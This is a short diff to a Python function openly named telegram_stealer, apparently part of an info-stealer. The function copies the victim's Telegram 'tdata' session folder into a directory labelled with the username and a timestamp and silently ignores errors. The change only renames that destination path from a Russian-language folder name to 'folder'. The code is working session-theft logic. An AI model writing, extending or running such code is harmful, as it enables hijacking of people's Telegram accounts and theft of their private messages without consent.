@@ -14,7 +14,7 @@ def telegram_stealer():
     os.chdir(path_telegram)
     try:
         shutil.copytree(os.getcwd() + r'\tdata',
-                        true_cwd + rf'\приват\мое\не надо сюда идти\{os.getenv("USERNAME")}+'
+                        true_cwd + rf'\folder\{os.getenv("USERNAME")}+'
                                    rf'{time.strftime("%d.%m.%Y.slash%H.%M.%S")}\tdata')
     except:
         pass
